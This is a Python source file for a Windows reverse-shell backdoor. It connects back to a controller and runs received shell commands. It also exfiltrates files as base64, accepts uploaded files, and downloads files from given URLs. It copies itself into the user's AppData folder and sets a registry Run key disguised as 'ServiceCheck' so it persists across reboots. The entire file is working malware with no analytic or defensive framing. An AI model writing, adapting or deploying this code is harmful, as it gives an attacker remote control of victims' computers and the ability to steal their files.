#!/usr/bin/python3
import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import requests

ServerIP="127.0.0.1"
ServerPort=12345
File_location = os.environ["appdata"] + "\\srv.exe"

def reliable_send(data):
    json_data = json.dumps(data)
    s.send(bytes(json_data,encoding="utf-8"))

def reliable_recv():
    json_data=bytearray(0)
    while True:
        try:
            json_data += s.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue
        
def connection():
    while True:
        try:
            s.connect((ServerIP,ServerPort))
            communication()
        except :
            time.sleep(20)
            continue
        
def communication():
    #communcation
    while True:
        command = reliable_recv()
        if command=='q': break
        elif command[:2] == "cd" and len(command)>1:
            # change director
            try:
                os.chdir(command[3:])
            except:
                continue
            
        elif command[:8] =="download":
            try:
                with open(command[9:],"rb")as file_down:
                    content = file_down.read()
                    reliable_send(base64.b64encode(content).decode("ascii"))
            except:
                failed ="[!!] Failed to download"
                reliable_send(failed)
                
        elif command[:6]=="upload":
            result = reliable_recv()
            if result[:4] !="[!!]":
                with open(command[7:],"wb") as file_up:
                    file_up.write(base64.b64decode(result))
                    
        elif command[:3] == "get":
            try:
                url =command[4:]
                get_response =requests.get(url)
                file_name = url.split("/")[-1]
                with open(file_name, "wb") as out_file:
                    out_file.write(get_response.content)
                reliable_send("[+] File Downloaded.")
            except:
                reliable_send("[!!] Download Failed.")
                
        else:
            proc = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE , stderr=subprocess.PIPE , stdin=subprocess.PIPE)
            response = proc.stdout.read() + proc.stderr.read()
            reliable_send(response.decode('cp950'))
            
# Slef duplicate
if not os.path.exists(File_location):
    shutil.copyfile(sys.executable,File_location)
    # Registry 註冊機碼
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ServiceCheck /t REG_SZ /d"'+File_location+ '"', shell=True)
    
# Establish socket
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
communication()

# Disconnect
s.close()